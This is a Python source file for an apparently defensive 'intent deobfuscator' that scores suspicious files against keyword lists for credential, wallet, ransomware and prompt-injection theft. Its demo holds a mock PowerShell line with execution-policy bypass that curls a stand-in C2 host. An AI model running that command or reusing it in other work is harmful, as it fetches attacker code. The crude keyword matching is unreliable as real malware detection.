"""
CogniGuard AI - Autonomous Reverse Engineering & Intent Deobfuscator
Author: CogniGuard Engineering Team
Description: Inspects raw scripts/binaries in memory to deduce attacker intent
             (Bank PIN, Browser Passwords, Crypto Wallet, or Ransomware).
"""

import base64
import binascii
import os
import re
import sys
from typing import Any, Dict, List, Tuple

if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")

_SRC_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if _SRC_DIR not in sys.path:
    sys.path.insert(0, _SRC_DIR)

from agent.heuristics import DANGEROUS_EXTENSIONS  # noqa: E402

_BASE64_CHUNK_RE = re.compile(r"(?<![A-Za-z0-9+/=])[A-Za-z0-9+/]{16,512}={0,2}(?![A-Za-z0-9+/=])")
_TOKEN_RE = re.compile(r"[a-z]{2,}")

# Weighted concept vectors approximating semantic attention without external ML dependencies
_SEMANTIC_CONCEPTS: Dict[str, Dict[str, float]] = {
    "BANK_CREDENTIALS": {
        "bank": 0.4, "pin": 0.45, "otp": 0.45, "cvv": 0.5, "kyc": 0.45,
        "upi": 0.45, "netbanking": 0.5, "wire": 0.25, "transfer": 0.2,
        "account": 0.2, "suspended": 0.35, "verify": 0.25,
    },
    "BROWSER_PASSWORDS": {
        "cookie": 0.4, "cookies": 0.45, "session": 0.25, "token": 0.35,
        "tokens": 0.35, "password": 0.4, "passwords": 0.45, "credential": 0.4,
        "credentials": 0.4, "chrome": 0.25, "browser": 0.25, "vault": 0.35,
        "keychain": 0.45, "sqlite": 0.2, "exfiltrate": 0.45,
    },
    "CRYPTO_WALLET": {
        "wallet": 0.45, "seed": 0.4, "mnemonic": 0.5, "phrase": 0.35,
        "recovery": 0.35, "metamask": 0.5, "phantom": 0.4, "solana": 0.4,
        "ethereum": 0.35, "keystore": 0.45, "private": 0.2, "drain": 0.45,
    },
    "RANSOMWARE_ENCRYPTION": {
        "encrypt": 0.45, "encrypted": 0.45, "ransom": 0.6, "locked": 0.45,
        "decrypt": 0.45, "bitcoin": 0.35, "directories": 0.2, "readme": 0.15,
    },
    "AI_PROMPT_INJECTION": {
        "ignore": 0.35, "previous": 0.35, "instructions": 0.35, "system": 0.25,
        "prompt": 0.35, "override": 0.4, "bypass": 0.4, "safety": 0.3,
        "jailbreak": 0.55, "disregard": 0.45, "secret": 0.25,
    },
}


def _decode_inline_base64(text: str) -> str:
    """Safely decode inline base64 strings in memory so obfuscated intent words are exposed."""
    decoded_parts: List[str] = []
    for match in _BASE64_CHUNK_RE.findall(text)[:10]:
        padded = match + ("=" * ((4 - len(match) % 4) % 4))
        try:
            raw = base64.b64decode(padded, validate=True)
            decoded = raw.decode("utf-8", errors="ignore")
            if decoded and sum(ch.isprintable() for ch in decoded) / len(decoded) >= 0.85:
                decoded_parts.append(decoded)
        except (binascii.Error, ValueError):
            continue
    return " ".join(decoded_parts)


def _compute_semantic_scores(text: str) -> Dict[str, float]:
    """Compute normalized concept attention weights across normalized unigram tokens."""
    normalized = re.sub(r"([a-z])([A-Z])", r"\1 \2", text).replace("_", " ").lower()
    tokens = set(_TOKEN_RE.findall(normalized))
    scores: Dict[str, float] = {}
    for category, weights in _SEMANTIC_CONCEPTS.items():
        score = sum(w for tok, w in weights.items() if tok in tokens)
        scores[category] = round(min(1.0, score), 2)
    return scores


class IntentReverseEngineer:
    """In-memory static & semantic intent analyzer for suspicious payloads."""

    def __init__(self):
        self.intent_signatures = {
            "BANK_CREDENTIALS": [
                b"bank", b"pin", b"cvv", b"routing", b"netbanking", b"otp",
            ],
            "BROWSER_PASSWORDS": [
                b"login data", b"cookies", b"web data", b"cryptunprotectdata", b"chrome", b"vault",
            ],
            "CRYPTO_WALLET": [
                b"wallet.dat", b"metamask", b"seed", b"mnemonic", b"solana", b"keystore",
            ],
            "RANSOMWARE_ENCRYPTION": [
                b"ransom", b".locked", b"decrypt_notes", b"bitcoin",
            ],
        }
        self.voice_scripts = {
            "BANK_CREDENTIALS": (
                "Warning! CogniGuard has reverse-engineered this script. "
                "The attacker is actively attempting to steal your Bank PIN and financial accounts. "
                "Permission requested: Shall I permanently shred and delete this file?"
            ),
            "BROWSER_PASSWORDS": (
                "Warning! Threat analyzed. The hacker is attempting to extract your Google Chrome "
                "saved passwords and session cookies. Permission requested: Shall I permanently shred and delete this file?"
            ),
            "CRYPTO_WALLET": (
                "Critical Alert! Reverse engineering detected a wallet drainer attempting to steal "
                "your cryptocurrency keys. Permission requested: Shall I permanently shred and delete this file?"
            ),
            "RANSOMWARE_ENCRYPTION": (
                "Emergency Alert! Ransomware encryption code detected. The attacker is trying to lock "
                "your personal documents and photos. Permission requested: Shall I permanently shred and delete this file?"
            ),
            "AI_PROMPT_INJECTION": (
                "Security Alert! Hidden AI prompt injection instructions detected inside this payload. "
                "Permission requested: Shall I permanently shred and delete this file?"
            ),
            "NONE": "File analyzed. No credential theft, wallet drainer, or ransomware intent detected.",
        }

    def analyze_file_intent(self, file_content: bytes, filename: str) -> Dict[str, Any]:
        """Reverse-engineer file bytes and semantic concept signals to uncover attacker intent."""
        raw_text = file_content.decode("utf-8", errors="ignore")
        expanded_text = f"{raw_text} {_decode_inline_base64(raw_text)}".strip()
        lower_content = expanded_text.lower().encode("utf-8", errors="ignore")
        lower_name = filename.strip().lower()
        detected_intents: List[str] = []

        for category, patterns in self.intent_signatures.items():
            if any(pattern in lower_content for pattern in patterns):
                detected_intents.append(category)

        semantic_scores = _compute_semantic_scores(expanded_text)
        for category, score in sorted(semantic_scores.items(), key=lambda item: item[1], reverse=True):
            if score >= 0.70 and category not in detected_intents:
                detected_intents.append(category)

        is_risky_ext = lower_name.endswith(DANGEROUS_EXTENSIONS)
        if not detected_intents and is_risky_ext:
            if "invoice" in lower_name or "bank" in lower_name:
                detected_intents.append("BANK_CREDENTIALS")
            else:
                detected_intents.append("BROWSER_PASSWORDS")

        if not detected_intents:
            max_semantic = max(semantic_scores.values(), default=0.0)
            return {
                "filename": filename,
                "primary_target": "NONE",
                "detected_intents": [],
                "semantic_scores": semantic_scores,
                "spoken_warning": self.voice_scripts["NONE"],
                "recommended_action": "ALLOW",
                "threat_score": round(max(0.05, min(0.35, max_semantic * 0.4)), 2),
            }

        primary_target = detected_intents[0]
        return {
            "filename": filename,
            "primary_target": primary_target,
            "detected_intents": detected_intents,
            "semantic_scores": semantic_scores,
            "spoken_warning": self.voice_scripts.get(primary_target, self.voice_scripts["BROWSER_PASSWORDS"]),
            "recommended_action": "SHRED_AND_DELETE",
            "threat_score": 0.99,
        }


if __name__ == "__main__":
    engineer = IntentReverseEngineer()
    mock_hacker_script = b"powershell -exec bypass -c function GrabBankPIN() { curl http://c2.server/pin_stealer }"
    result = engineer.analyze_file_intent(mock_hacker_script, "Fake_Invoice.vbs")

    print("=" * 65)
    print("🔍 REVERSE ENGINEERING AUDIT RESULT:")
    print(f"🎯 Stolen Target Identified: {result['primary_target']}")
    print(f"🎙️ Spoken AI Script:\n\"{result['spoken_warning']}\"")
    print(f"⚡ Recommended Action:       {result['recommended_action']}")
    print("=" * 65)
